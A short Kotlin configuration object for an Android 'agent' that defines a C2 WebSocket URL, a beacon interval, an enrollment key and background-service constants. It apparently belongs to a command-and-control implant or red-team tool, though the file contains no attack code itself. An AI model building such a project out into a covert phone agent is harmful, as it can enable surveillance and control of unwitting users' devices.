package ai.bixtx.agent

object Config {
    val C2_WS_URL: String       get() = BuildConfig.C2_WS_URL
    val BEACON_INTERVAL: Long   get() = BuildConfig.BEACON_INTERVAL.toLong() * 1000L
    val ENROLL_KEY: String      get() = BuildConfig.ENROLL_KEY
    val AGENT_VERSION: String   get() = BuildConfig.AGENT_VERSION
    const val PLATFORM          = "android"
    const val NOTIFICATION_ID   = 9001
    const val CHANNEL_ID        = "ai.bixtx.agent.bg"
    const val RECONNECT_DELAY   = 2_000L
    const val MAX_RECONNECT     = 60_000L
}
